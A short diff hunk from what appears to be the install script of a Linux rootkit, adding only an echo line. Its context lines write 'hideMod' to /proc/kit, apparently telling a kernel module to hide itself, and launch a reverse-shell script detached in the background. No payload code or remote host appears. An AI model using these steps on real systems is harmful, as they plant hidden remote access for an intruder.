@@ -11,6 +11,7 @@ echo "hideMod" > /proc/kit &&
 ./reverseShell.sh & disown
 
 
+echo "waiting"
 sleep 10 #TODO: check reverse shell finished
 #install.sh reverseShell.sh  blank.ko
 
